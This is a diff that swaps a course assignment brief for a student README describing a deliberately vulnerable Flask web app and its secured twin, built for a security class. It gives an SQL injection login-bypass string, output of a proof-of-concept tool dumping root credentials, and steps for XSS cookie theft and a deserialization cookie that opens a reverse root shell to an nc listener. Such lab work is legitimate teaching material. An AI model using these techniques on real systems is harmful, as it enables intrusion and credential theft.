@@ -15,25 +15,146 @@ For all vulnerabilities:
 - The implementation must follow the logic and purpose of the application;
 - Students should be able to demonstrate the vulnerability;
 
-A bonus of 10% can be provided if the vulnerability is subtle (needs a careful analysis), can be attributed to a bug (developer can repudiate having authored the vulnerability).
+# Vulnerable flask based web application
 
-It is expected that a user can fully understand the purpose of the application, and use it. Implementation can be simple and some functions may be missing (e.g. if it’s a book store, the back-end can be omitted). After reading the report, a reader should be able to understand the application, the vulnerabilities, their exploration and impact, and how they can be avoided.
+Project with the goal to make one web application with two versions:
 
-The project is expected to be implemented by **a group of 4 students**, and **MUST** reside in a private repository in the [github/detiuaveiro](https://github.com/detiuaveiro) organization, using the Github Classroom functionality (this is mandatory).
+- app, web application with security issues
+- appsec, web application with the security issues fixed
 
-### Project delivery
+## Vulnerabilities present
 
-Delivery should consist of a git repository with at least three folders and a file:
+- Plaintext Passwords
+- SQLi
+- Forced Browsing
+- XSS
+- Insecure deserialization
 
-- `app`: contains the insecure application, including instructions to run it.
-- `app_sec`: contains the secure application, including instructions to run it.
-- `analysis`: contains scripts/textual descriptions/logs/screen captures demonstrating the exploration of each vulnerability and the fix implemented;
-- `README.md`: contains the project description, authors, identifies vulnerabilities implemented;
+## Usage
 
-Projects will be graded according to the CWE (e.g, its score), the implementation and exploration of the flawed code, the implementation of the secure code, and the documentation produced.
+### To run the web application
 
-The use of automated tools to scan the application is not forbidden. 
-However, grading will mostly consider your work and your analysis, not on the findings (as they are deliberate).
+1. Go to the desired web application directory
+2. Run the following command:
+    
+    ```bash
+    docker-compose up --build
+    ```
+    
+3. go to the following [url](http://localhost/) 
 
-This project is expected to be authored by the students enrolled in the course. The use of existing code snippets, applications, or any other external functional element without proper acknowledgement is strictly forbidden. Themes and python/php/javascript libraries can be used, as long as the vulnerabilities are created by the students. If any content lacking proper acknowledgment is found in other sources, the 
-current rules regarding plagiarism will be followed.
+### To run the POC (poorsploit.py)
+
+1. Go to the project directory
+2. Run the following command
+    
+    ```bash
+    python3 poorsploit.py
+    ```
+    
+3. Choose the exploit we want to exploit with the POC (poorsploit.py)
+    
+    ```bash
+    python3 poorsploit.py
+     ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ _________ 
+    ||P |||o |||o |||r |||s |||p |||l |||o |||i |||t |||       ||
+    ||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||_______||
+    |/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\| (Metasploit at home™️)
+    
+    [?] Choose one of the options:
+           1 - SQli
+           2 - Insecure Deserialization
+           3 - XSS
+           4 - Forced Browsing
+           5 - quit
+    > 
+    ```
+    
+
+### To run go into the database
+
+1. Check in witch container id the mysql db is running by executing the below command
+    
+    ```bash
+    docker ps
+    ```
+    
+2. Run the following command to get access to the mysql db
+    
+    ```bash
+    docker exec -it <container−id> mysql -h localhost -P 3306 -u root -proot
+    ```
+    
+
+## Exploitation
+
+### SQLi
+
+Manually:
+
+```bash
+username: <username of user we know exists>' -- \\
+password: <anything>
+```
+
+Automatically:
+
+```bash
+> python3 poorsploit.py
+ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ _________ 
+||P |||o |||o |||r |||s |||p |||l |||o |||i |||t |||       ||
+||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||_______||
+|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\| (Metasploit at home™️)
+
+[?] Choose one of the options:
+       1 - SQli
+       2 - Insecure Deserialization
+       3 - XSS
+       4 - Forced Browsing
+       5 - quit
+> 1
+[!] Username is : root
+[!] Password is: root
+```
+
+### Forced Browsing
+
+1. Log in
+2. Run the poorsploit.py to check if there are any interesting directories on the robots.txt file
+3. Check out those directories mentioned
+
+### XSS
+
+1. Log in to post something
+2. Run the poorsploit.py to get the payload we are going to post on the website
+3. Just wait and see the poorsploit server output with the stolen cookies (it will repeat some)
+4. Close the server when done with ctrl+c
+
+### Insecure deserialization
+
+1. Log in as an user to get a cookie
+2. On our machine run a net cat listener for our reverse shell:
+    
+    ```bash
+    nc -lnvp 9999
+    ```
+    
+3. Run the poorsploit.py to get a cookie that enables us to run a reverse shell on the target machine
+4. Change the cookie we have on the browser for the one we got from poorsploit.py and refresh the page
+5. We get a root shell on our listener terminal like the following:
+    
+    ```bash
+    > nc -lnvp 9999
+    Connection from 172.20.0.4:49470
+    bash: cannot set terminal process group (1): Inappropriate ioctl for device
+    bash: no job control in this shell
+    root@aca189c0881c:/app#
+    ```
+    
+
+## Authors
+
+Rodrigo Lima, nmec: 98475 <br>
+Camila Fonseca, nmec: 97880 <br>
+Patrícia Dias, nmec: 98546 <br>
+Isadora Loredo, nmec: 91322 <br>
